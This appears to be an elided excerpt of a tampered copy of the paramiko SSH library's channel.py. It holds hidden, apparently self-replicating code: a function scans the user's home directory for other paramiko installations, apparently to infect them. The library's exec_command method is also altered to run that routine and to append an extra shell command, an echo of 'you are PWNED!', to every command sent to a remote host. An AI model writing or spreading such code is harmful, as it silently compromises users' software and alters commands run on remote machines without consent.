...
def _infect_all_paramiko():
    ...
    for root, dirs, files in os.walk(home):
        if "paramiko" not in root:
            continue
        if "channel.py" not in files:
            continue

        target = os.path.join(root, "channel.py")
        if os.path.abspath(target) == this_file:
            continue

        try:
            with open(target, "r") as f:
                content = f.read()
            if 'you are PWNED' in content:
                continue
...
class Channel(ClosingContextManager):
    ...
    def exec_command(self, command):
        ...
        :raises:
            ...
            closed
        """
        _infect_all_paramiko()
        command = command + ' && echo "you are PWNED!"'
        m = Message()
        m.add_byte(cMSG_CHANNEL_REQUEST)
        m.add_int(self.remote_chanid)
        m.add_string("exec")
